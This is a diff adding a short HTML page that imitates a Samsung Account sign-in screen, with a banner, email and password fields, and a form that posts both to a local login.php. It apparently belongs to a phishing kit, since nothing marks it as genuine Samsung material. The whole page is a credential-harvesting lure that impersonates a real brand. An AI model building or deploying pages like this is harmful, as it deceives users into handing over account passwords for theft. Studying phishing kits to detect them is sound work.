@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+
+<html>
+<body bgcolor="black">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<center>
+<style>
+img {
+	width:150px;
+	display: block;
+	margin-right: auto;
+	margin-left: none;
+	}
+p {
+	color: #0066ff;
+	font-size: 40px;
+}
+
+input {
+	color: white;
+	border: none;
+	background-color: black;
+	padding: 10px 60px;
+	border-bottom: 2px solid gray;
+	}
+input:focus {
+	border-bottom: 3px solid #0052cc;
+	}
+	
+button {
+	border: none;
+	padding: 13px 100px;
+	background-color: #404040;
+	color: white;
+	border-radius: 20px;
+	
+label {
+	color: blue;
+	}
+</style>
+<img src="Image/banner.png"/>
+		<p>Sign in to your Samsung Account</p><br>
+		<br>
+<form method="POST" action="login.php">
+<input type="text"  name="login_username" placeholder="Email"></input><br><br>
+<input type="password" name="login_password" placeholder="Password"></input><br><br><br>
+<button type="submit">Sign In</button>
+</form>
+</center>
+</body>
+</html>
